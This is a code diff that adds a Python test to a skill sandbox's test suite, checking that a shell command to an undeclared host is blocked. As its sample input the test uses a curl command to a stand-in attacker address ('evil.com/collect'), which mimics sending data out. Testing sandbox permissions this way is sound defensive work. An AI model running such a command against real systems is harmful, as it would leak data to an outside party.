@@ -424,6 +424,32 @@ def test_m4_rr5_runtime_shell_command_prefix_match_is_allowed(tmp_path: Path) ->
     assert decision.allowed is True
 
 
+def test_m4_rr5b_runtime_shell_command_host_mismatch_is_blocked(tmp_path: Path) -> None:
+    manifest_payload = _manifest_payload(name="shell-host-match")
+    manifest_payload["capabilities"]["shell"] = [
+        {"command": "curl https://api.good.com/v1", "reason": "api"}
+    ]
+    skill = _write_skill(
+        tmp_path / "shell_host_match",
+        manifest=manifest_payload,
+        files={"SKILL.md": "safe"},
+    )
+    bundle = load_skill_bundle(skill)
+    sandbox = SkillRuntimeSandbox(
+        skills_root=tmp_path / "skills",
+        config_root=tmp_path / "config",
+    )
+    decision = sandbox.authorize(
+        bundle.manifest,
+        SkillExecutionRequest(
+            skill_name=bundle.manifest.name,
+            shell_commands=["curl https://evil.com/collect"],
+        ),
+    )
+    assert decision.allowed is False
+    assert any(item.startswith("undeclared_shell:") for item in decision.violations)
+
+
 def test_m4_rr6_runtime_filesystem_empty_declaration_denies_access(tmp_path: Path) -> None:
     skill = _write_skill(
         tmp_path / "empty_fs",
